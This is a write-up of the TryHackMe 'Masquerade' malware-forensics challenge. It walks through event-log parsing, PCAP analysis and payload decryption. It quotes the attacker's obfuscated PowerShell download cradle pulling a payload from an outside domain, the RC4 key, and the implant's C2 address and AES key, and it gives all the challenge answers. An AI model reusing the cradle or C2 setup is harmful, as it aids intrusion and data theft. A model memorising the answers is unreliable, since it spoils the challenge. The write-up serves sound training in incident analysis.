# [Masquerade](https://tryhackme.com/room/masquerade)

## Our company may have been compromised, we need your help ASAP.

# Scenario

Jim from the Finance department received an email that appeared to come from the company’s system administrator, asking him to run a script to "**apply critical security updates.**" Trusting the message, Jim executed the script on his workstation. Shortly after, unusual network traffic and system activity were observed. You have been provided with relevant artifacts to investigate what happened, determine the impact, and identify how the attacker established control over the system.

**Important!**: These artifacts contain **real malware;** however, the challenge can be completed entirely through static analysis, and there is no need to run or execute any of the files. Despite that, analysis should still be conducted in a **controlled environment** such as a lab machine (**VM**).

# Challenge - Questions

## Good Luck Detective!

### What external domain was contacted during script execution?

1. Start by parsing the `.evtx` log so it's readable outside of the Windows Event Viewer. `python-evtx` can extract each record's raw XML, which we then walk with `xml.etree.ElementTree` to pull out the Event ID, timestamp, and most importantly the `ScriptBlockText` field that PowerShell's Script Block Logging records. This field contains the de-obfuscated script text as PowerShell actually parsed it, which is exactly what we want when the attacker has hidden their intent behind string concatenation.

```py
from Evtx.Evtx import Evtx
import xml.etree.ElementTree as ET

evtx_file = "dist/Powershell-Operational.evtx"
ns = {'e': 'http://schemas.microsoft.com/win/2004/08/events/event'}

with Evtx(evtx_file) as log:
    for record in log.records():
        xml_data = record.xml()
        root = ET.fromstring(xml_data)

        event_id = root.find(".//e:EventID", ns)
        time_created = root.find(".//e:TimeCreated",ns)

        print("EventID:", event_id.text if event_id is not None else None)
        print("Time:" , time_created.attrib.get("SystemTime") if time_created is not None else None)
        print("\n\n\n\n\n"+xml_data)
        print("-" * 40)
```

2. Scrolling through the printed `ScriptBlockText` values turns up the download cradle. The attacker split the URL into several short substrings and joined them at runtime, a common trick to defeat simple string/YARA signatures looking for `http://` or a full domain name in one contiguous chunk:

```bash
$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''
```

3. Reassembling the joined fragments gives `http://api-edgecloud.xyz/amd.bin`. The trailing `-replace ('\'+'s'),''` dynamically builds the regex pattern `\s` and strips whitespace from the downloaded string.

**Answer:** `api-edgecloud.xyz`

---

### What encryption algorithm was used by the script?

1. Further down in the same `ScriptBlockText`, the script runs a block that initializes a 256-byte array `$s = 0..255`, then performs a key-scheduling loop that swaps array elements using a running index derived from a key, followed by a second loop that XORs each input byte against a value pulled from the same swapped array. This is the textbook **Key-Scheduling Algorithm** and **Pseudo-Random Generation Algorithm** structure of the **RC4** stream cipher. The `0..255` byte-array initialization and the `$s[$i], $s[$j]` swap pattern are the giveaway.

```bash
$s = 0..255
$j = 0
for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256
    $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
}

$i = $j = 0
$d = foreach ($byte in $b) {
    $i = ($i + 1) % 256
    $j = ($j + $s[$i]) % 256
    $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
    $byte -bxor $s[($s[$i] + $s[$j]) % 256]
}
```

**Answer:** `RC4`

---

### What key was used to decrypt the second-stage payload?

1. RC4 needs a key to seed the KSA above. Searching the same `ScriptBlockText` output for where `$k` is defined shows the key is built the same way the URL was, split into short fragments and concatenated at runtime, then converted to raw bytes:

```
<Data Name="ScriptBlockText">$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
```

2. Concatenating the fragments gives the literal key string used to seed the cipher.

**Answer:** `X9vT3pL2QwE8xR6ZkYhC4s`

---

### What was the timestamp of the server response containing the payload?

1. Open `traffic.pcapng` in Wireshark and filter on `http` to isolate the plaintext HTTP conversation.

2. Locate the request for `/amd.bin`. The accompanying response, frame `1655`, carries the binary payload. Right-click it and choose **Follow -> HTTP Stream**.

3. In the HTTP stream view, the server's response headers include a `Date` field, which is the timestamp the web server generated the response containing `amd.bin`.

**Answer:** `Fri, 10 Apr 2026 05:28:23 GMT`

---

### What is the SHA-256 hash of the extracted and decrypted payload?

1. With the HTTP stream still open, use **File -> Export Objects -> HTTP**, select the `amd.bin` object, and save it to disk. Because the download cradle fetched the file as a hex-encoded string, the exported object will itself be ASCII hex text rather than a raw PE file.

2. Reproduce the RC4 logic from the PowerShell script in Python, using the key recovered above, to decrypt the hex-decoded bytes back into the original binary:

```py
import requests

k = ('X9vT3pL2QwE8xR6ZkYhC4s').encode("utf-8")

input_path = "dist/amd.bin"
output_path = "dist/amd.exe"

with open(input_path, "r", encoding="utf-8") as f:
    h = f.read().strip()

b = bytes.fromhex(h)

s = list(range(256))
j = 0

for i in range(256):
    j = (j + s[i] + k[i % len(k)]) % 256
    s[i], s[j] = s[j], s[i]

i = j = 0
out = bytearray()

for byte in b:
    i = (i + 1) % 256
    j = (j + s[i]) % 256
    s[i], s[j] = s[j], s[i]
    K = s[(s[i] + s[j]) % 256]
    out.append(byte ^ K)

with open(output_path, "wb") as f:
    f.write(out)
```

3. Confirm the output is a valid PE, then hash it:

```bash
sha256sum amd.exe
```

**Answer:** `e3d39d42df63c6874780737244370ba517820f598fd2443e47ff6580f10c17cb`

---

### What remote URL did the client use to communicate with the victim machine?

1. `amd.exe` is a **.NET** binary, so it decompiles cleanly back to near-original C# source rather than raw assembly. Use `ilspycmd` to decompile it:

```bash
ilspycmd amd.exe
```

2. Skimming the decompiled source for hardcoded configuration constants turns up the implant's C2 address:

**Results:**

```cs
private const string SITE_URL = "http://34.174.57.99";
```

**Answer:** `http://34.174.57.99`

---

### Which encryption key and algorithm does the client use?

1. Continuing through the same decompiled source, alongside `SITE_URL` sits another constant used to protect the C2 traffic:

**Results:**

```cs
private const string CIPHER = "M4squ3r4d3Th3P4ck3tSt34lthM0d31337";
```

2. Tracing where `CIPHER` is consumed shows it isn't used as a raw key directly. it's first hashed with **SHA-256** to derive a 32-byte key, which is then fed into an **AES** cipher object configured for **CBC** mode with PKCS7 padding, and a random 16-byte IV prepended to each ciphertext blob. So functionally the client uses AES-256-CBC, keyed by `SHA256("M4squ3r4d3Th3P4ck3tSt34lthM0d31337")`.

**Answer:** `M4squ3r4d3Th3P4ck3tSt34lthM0d31337, AES`

---

### After determining the client's encryption, decrypt the commands the attacker executed on the victim and submit the flag.

1. Back in Wireshark, the implant beacons over plain HTTP GET requests that smuggle its encrypted payloads inside a query parameter, disguised as an image-fetch request. Filter on: `http.request.uri contains "/images?guid="`

2. One of the matching requests, frame `3703`, carries the C2 traffic of interest. Copy the value of the `guid` parameter. The decompiled source shows the client base64-encodes the AES output once, then base64-encodes that result again before placing it on the wire, so decryption requires unwrapping two layers of Base64 before touching AES.

3. Reverse the pipeline: outer Base64 decode -> the result is itself an ASCII Base64 string -> inner Base64 decode -> the first 16 bytes are the IV, the remainder is the AES-CBC ciphertext -> derive the key as `SHA256(CIPHER_KEY)` -> AES-256-CBC decrypt -> strip PKCS7 padding:

```py
import base64
from hashlib import sha256
from Crypto.Cipher import AES

CIPHER_KEY = "M4squ3r4d3Th3P4ck3tSt34lthM0d31337"

def decrypt_payload(double_b64: str) -> str:
    layer1 = base64.b64decode(double_b64)

    inner_b64 = layer1.decode()
    layer2 = base64.b64decode(inner_b64)

    iv = layer2[:16]
    ciphertext = layer2[16:]

    key = sha256(CIPHER_KEY.encode()).digest()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)

    pad_len = plaintext[-1]
    plaintext = plaintext[:-pad_len]

    return plaintext.decode(errors="ignore")

if __name__ == "__main__":
    data = "UVRNZUdTS0ozRzRaUGNlaGhLRUd0aXl2R3Zub2N2YW5UZTh3ZmorMEx1WXBPdEIvL1BSSzZ1RW5oN0EvMTIxRUJ3Z3NQZk5Yb2d0VUYxOTV0MFZ1SUZDZ1cwcnRHYzlCYlFLK1NzTWd1NVE9"
    print(decrypt_payload(data))
```

4. Running the script against the `guid` value from frame `3703` decrypts to the beaconed hostname and, appended to it, the flag the implant was instructed to exfiltrate:

[SCREEN01]
